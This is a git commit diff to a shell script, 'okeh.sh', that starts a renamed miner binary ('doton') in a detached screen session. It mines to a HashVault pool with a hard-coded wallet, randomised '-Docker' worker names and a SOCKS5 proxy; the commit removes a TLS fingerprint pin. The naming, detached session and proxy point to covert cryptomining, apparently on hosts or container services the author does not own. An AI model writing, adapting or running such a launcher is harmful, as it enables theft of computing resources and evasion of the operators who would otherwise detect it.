5b8d31a0cd4cff0403beb72ec94766d5875f2a92
dfgfd443rete <86584933+dfgfd443rete@users.noreply.github.com>
2021-06-30 12:19:26 +0700

    Update okeh.sh

--- okeh.sh
+++ okeh.sh
@@ -6,6 +6,5 @@ screen -dmS ls
 POOL=pool.hashvault.pro:443
 WALLET=hvxy9P3HryFTBW4tAPkBaBRibwiM3x4roL1g6oGtUHPSVDHMqNueznj8mQPswmJKHCCY6cZGZ4TkUPdWbt4BhpP348B8rMJ6iz
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Docker)
-FINGERPRINT=420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
 PROXY=socks5://72.221.232.155:4145
-./doton --url pool.hashvault.pro:443 --user $WALLET --pass $WORKER --donate-level 1 --tls --tls-fingerprint $FINGERPRINT -x $PROXY
+./doton --url pool.hashvault.pro:443 --user $WALLET --pass $WORKER --donate-level 1 -x $PROXY
